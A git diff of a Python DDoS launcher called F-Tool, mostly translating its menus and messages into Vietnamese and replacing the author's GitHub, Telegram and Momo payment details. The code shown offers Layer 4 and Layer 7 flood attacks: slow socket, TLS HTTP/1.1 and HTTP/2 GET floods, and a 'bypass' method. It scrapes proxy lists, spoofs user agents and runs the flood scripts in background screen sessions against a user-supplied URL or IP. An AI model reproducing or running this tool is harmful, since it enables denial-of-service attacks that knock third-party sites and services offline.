@@ -36,7 +36,7 @@ class Home:
 		self.dev = dev
 
 	def getproxies(self):
-		#self.styleText("\n [*] Downloading Proxy...\n")
+		#self.styleText("\n [*] Đang tải xuống proxy...\n")
 		file_name = "utils/http.txt"
 		http_proxies = [
 			"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",#copyright by daudau
@@ -56,7 +56,7 @@ class Home:
 			else:
 				time.sleep(1)
 
-	def home(self): # don't edit this banner lol
+	def home(self): # đừng chỉnh sửa banner này
 		print(f"""
                         {Color.LG}╔════════════════════════╗
     {Color.LC}╔═╗{Color.LB} ╔╦╗╔═╗╔═╗╦      {Color.LG}║ {Color.LR}Created: {Color.LY}5/3/22        {Color.LG}║
@@ -101,13 +101,13 @@ class Home:
 					subprocess.run(['pkill -f F-Tool.py'], shell=True)
 				elif option in ['stop', 'STOP']:
 					subprocess.run(['pkill screen'], shell=True)
-					print(f"{Color.LG} [!] Attack Stopped!")
+					print(f"{Color.LG} [!] tấn công dừng lại!")
 				elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
 					os.system('clear');Tool.bbos()
 				elif option == "":
 					pass
 				else:
-					print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")
+					print(Color.LR+"yêu cầu: "+Color.LG+f"{option}"+Color.LR+" không tìm thấy")
 			except KeyboardInterrupt:
 				sys.exit(0)
 
@@ -120,15 +120,15 @@ class response_url:
 	def lookup(self, url):
 		try:
 			if url == '':
-				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
+				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" URL không hợp lệ"
 			resp = requests.get(f"http://ip-api.com/json/{url}?fields=status,message,country,countryCode,regionName,city,timezone,asname,isp,org,reverse,query", headers=self.headers).json()
 			if resp['status'] == 'success':
-				return Color.LG+"    [+] IP address: " + resp['query'] + "\n" +Color.LG+ "    [+] Host name: " + resp['reverse'] + "\n" +Color.LG+ "    [+] ISP: "+ resp['isp'] + "\n" +Color.LG+ "    [+] Organization: "+ resp['org'] + "\n" +Color.LG+ "    [+] Country: " + resp['country'] + " " + "(" + resp['countryCode'] + ")" + "\n" +Color.LG+ "    [+] Region: " + resp['regionName'] + "\n" +Color.LG+ "    [+] City: " + resp['city'] + "\n" +Color.LG+ "    [+] ASN: " + resp['asname'] + "\n" +Color.LG+ "    [+] Timezone: " + resp['timezone']#copyright by daudau
+				return Color.LG+"    [+] địa chỉ IP: " + resp['query'] + "\n" +Color.LG+ "    [+] Tên máy chủ: " + resp['reverse'] + "\n" +Color.LG+ "    [+] ISP: "+ resp['isp'] + "\n" +Color.LG+ "    [+] Tổ chức: "+ resp['org'] + "\n" +Color.LG+ "    [+] Quốc gia: " + resp['country'] + " " + "(" + resp['countryCode'] + ")" + "\n" +Color.LG+ "    [+] Tên vùng: " + resp['regionName'] + "\n" +Color.LG+ "    [+] Thành phố: " + resp['city'] + "\n" +Color.LG+ "    [+] biệt danh: " + resp['asname'] + "\n" +Color.LG+ "    [+] Múi giờ: " + resp['timezone']#copyright by daudau
 
 			else:
-				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" Invalid URL"
+				return Color.LG+"["+Color.LR+"!"+Color.LG+"]"+Color.LR+" URL không hợp lệ"
 		except requests.exceptions.ConnectionError:
-			return Color.LR+"Error: Check your Internet Connection."
+			return Color.LR+"Lỗi: Kiểm tra kết nối Internet của bạn."
 
 	def ip_lookup(self, ip):
 		try:
@@ -540,9 +540,9 @@ class Tool:
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					thread = int(input(f"{Color.LG} [>] Thread: "+Color.RESET))
 					subprocess.run([f'screen -dm python3 utils/L4/http {ip} {floodtime} {thread}'], shell=True)
-					print(Color.LG+f"\n [!] Attack sent successfully!\n")
+					print(Color.LG+f"\n [!] Tấn công được gửi thành công!\n")
 				except:
-					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
+					print(f"{Color.LR}LỖI: {Color.RESET}Thử lại")
 			elif option in ['ref', 'REF']:
 				self.l4()
 			elif option in ['home', 'HOME']:
@@ -557,7 +557,7 @@ class Tool:
 				subprocess.run(['pkill -f F-Tool.py'], shell=True)
 			elif option in ['stop', 'STOP']:
 				subprocess.run(['pkill screen'], shell=True)
-				print(f"{Color.LG} [!] Attack Stopped!")
+				print(f"{Color.LG} [!] tấn công dừng lại!")
 			elif option in ['00', '0']:
 				os.system('clear');self.bbos()
 			elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
@@ -565,7 +565,7 @@ class Tool:
 			elif option == "":
 				pass
 			else:
-				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")
+				print(Color.LR+"yêu cầu: "+Color.LG+f"{option}"+Color.LR+" không tìm thấy")
 
 	def l7(self):
 		print(f"""{Color.LG}
@@ -577,11 +577,11 @@ class Tool:
               |___/
 
 """)
-		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" SOCKET: Slow HTTP/1.1 socket flood (JS)")
-		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" HTTP1: TLS HTTP/1.1 GET flood (JS)")
-		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" HTTP2: TLS HTTP/2 GET flood (JS)")
-		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" CRINGE: Powerful Method Target Maybe die from Cringe (JS)")
-		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Return")
+		print(Color.LR+"["+Color.LG+"01"+Color.LR+"]"+Color.LC+" SOCKET: Lũ SOCKET HTTP/1.1 chậm (JS)")
+		print(Color.LR+"["+Color.LG+"02"+Color.LR+"]"+Color.LC+" HTTP1: TLS HTTP/1.1 GET lũ lụt (JS)")
+		print(Color.LR+"["+Color.LG+"03"+Color.LR+"]"+Color.LC+" HTTP2: TLS HTTP/2 GET lũ lụt (JS)")
+		print(Color.LR+"["+Color.LG+"04"+Color.LR+"]"+Color.LC+" CRINGE: Mục tiêu phương pháp mạnh mẽ Có thể chết vì CRINGE (JS)")
+		print(Color.LR+"["+Color.LG+"00"+Color.LR+"]"+Color.LC+" Quay lại")
 		print("\n")
 		while True:
 			sys.stdout.write(Color.LB+"╔═══"+Color.LR+"["+Color.LG+"F-Toolv2"+Color.LB+"@"+Color.LG+"Layer7"+Color.LR+"]"+Color.LB+"\n╚══> "+Color.RESET)
@@ -590,35 +590,35 @@ class Tool:
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
-					reqs = int(input(f"{Color.LG} [>] Reqs(200): "+Color.RESET))
+					reqs = int(input(f"{Color.LG} [>] Requests(200): "+Color.RESET))
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/socket {url} utils/http.txt {floodtime} {reqs}'], shell=True)
-					print(Color.LG+f"\n [!] Attack sent successfully!\n")
+					print(Color.LG+f"\n [!] Tấn công được gửi thành công!\n")
 				except:
-					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
+					print(f"{Color.LR}LỖI: {Color.RESET}Thử lại")
 			elif option in ['02', '2']:
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https1 GET {url} utils/http.txt {floodtime} 64 1'], shell=True)
-					print(Color.LG+f"\n [!] Attack sent successfully!\n")
+					print(Color.LG+f"\n [!] Tấn công được gửi thành công!\n")
 				except:
-					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
+					print(f"{Color.LR}LỖI: {Color.RESET}Thử lại")
 			elif option in ['02', '3']:
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/bypass {url} {floodtime}'], shell=True)
-					print(Color.LG+f"\n [!] Attack sent successfully!\n")
+					print(Color.LG+f"\n [!] Tấn công được gửi thành công!\n")
 				except:
-					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
+					print(f"{Color.LR}LỖI: {Color.RESET}Thử lại")
 			elif option in ['04', '4']:
 				try:
 					url = str(input(f"{Color.LG} [>] URL: "+Color.RESET))
 					floodtime = int(input(f"{Color.LG} [>] Time: "+Color.RESET))
 					F_Tool.getproxies();subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} 1'], shell=True)
-					print(Color.LG+f"\n [!] Attack sent successfully!\n")
+					print(Color.LG+f"\n [!] Tấn công được gửi thành công!\n")
 				except:
-					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
+					print(f"{Color.LR}LỖI: {Color.RESET}Thử lại")
 			elif option in ['ref', 'REF']:
 				self.l7()
 			elif option in ['home', 'HOME']:
@@ -634,7 +634,7 @@ class Tool:
 				subprocess.run(['pkill -f F-Tool.py'], shell=True)
 			elif option in ['stop', 'STOP']:
 				subprocess.run(['pkill screen'], shell=True)
-				print(f"{Color.LG} [!] Attack Stopped!")
+				print(f"{Color.LG} [!] Cuộc tấn công đã dừng lại!")
 			elif option in ['00', '0']:
 				os.system('clear');self.bbos()
 			elif option in ['ddos', 'DDOS', 'bbos', 'BBOS']:
@@ -642,7 +642,7 @@ class Tool:
 			elif option == "":
 				pass
 			else:
-				print(Color.LR+"command: "+Color.LG+f"{option}"+Color.LR+" not found")
+				print(Color.LR+"yêu cầu: "+Color.LG+f"{option}"+Color.LR+" không tìm thấy")
 
 def soon():
 	pass
@@ -675,26 +675,26 @@ def spoof_useragents():
 
 def main():
 	#  checking if you're gay 😏
-	F_Tool.styleText("[+] Checking Dependencies...\n\n")
+	F_Tool.styleText("[+] Kiểm tra phụ thuộc...\n\n")
 	pkgs = ['screen', 'node']
 	install = True
 	for pkg in pkgs:
 		ur_mom = which(pkg)
 		if ur_mom == None:
-			F_Tool.styleText(f"[!] {pkg} is not installed!\n")
+			F_Tool.styleText(f"[!] {pkg} không được cài đặt!\n")
 			install = False
 		else:
 			pass
 	if install == False:
-		sys.exit(f'\n[?] Error? try:{Color.LG} sh install.sh')
+		sys.exit(f'\n[?] Lỗi? thử:{Color.LG} sh install.sh')
 	else:pass
 	try:
 		script = True
 		with open('utils') as important:pass
 	except IsADirectoryError:pass
 	except FileNotFoundError:
-		print(f"{Color.LR}[CRITICAL ERROR]:{Color.RESET} File: 'utils' NotFound")
-		print("\n[+] Please download on GitHub, or git clone: https://github.com/ngdangtr/F-Tool\n")
+		print(f"{Color.LR}[CRITICAL ERROR]:{Color.RESET} File: 'utils' Không tìm thấy")
+		print("\n[+] Vui lòng tải xuống trên GitHub, hoặc git clone https://github.com/DauDau432/F-Tool\n")
 		os.remove(f'{__file__}')
 		script = False
 	if script == False:sys.exit()
@@ -702,15 +702,15 @@ def main():
 
 
 if __name__ == '__main__':
-	commands = f"""{Color.LC}HOME{Color.LR} ~>{Color.LY}Back to home
-{Color.LC}REF{Color.LR} ~> {Color.LY}Refresh the menu
-{Color.LC}CLEAR{Color.LR} ~> {Color.LY}Clear your face xd
-{Color.LC}EXIT{Color.LR} ~> {Color.LY}Exit the program
-{Color.LC}BBOS{Color.LR} ~> {Color.LY}L4/L7 DDOS Attack
-{Color.LC}STOP{Color.LR} ~> {Color.LY}Stop your Attack
-{Color.LC}DEV{Color.LR} ~> {Color.LY}Contact/Support dev"""
-	dev = f"""{Color.LC}Telegram{Color.LR}: {Color.LY}https://t.me/ngdangtr
-{Color.LC}Momo{Color.LR}: {Color.LY}0965849504"""
+	commands = f"""{Color.LC}HOME{Color.LR} ~>{Color.LY}Trở về home
+{Color.LC}REF{Color.LR} ~> {Color.LY}Làm mới menu
+{Color.LC}CLEAR{Color.LR} ~> {Color.LY}Xóa màn hình
+{Color.LC}EXIT{Color.LR} ~> {Color.LY}Thoát khỏi chương trình
+{Color.LC}BBOS{Color.LR} ~> {Color.LY}Tấn công DDOS L4/L7
+{Color.LC}STOP{Color.LR} ~> {Color.LY}Dừng cuộc tấn công của bạn
+{Color.LC}DEV{Color.LR} ~> {Color.LY}Liên hệ / Hỗ trợ nhà phát triển"""
+	dev = f"""{Color.LC}Telegram{Color.LR}: {Color.LY}https://t.me/Daukute
+{Color.LC}Momo{Color.LR}: {Color.LY}0983538806"""
 	F_Tool = Home(commands, dev)
 	Tool = Tool(commands, dev, spoof_useragents())
 	try:open('F-Tool.py');main()
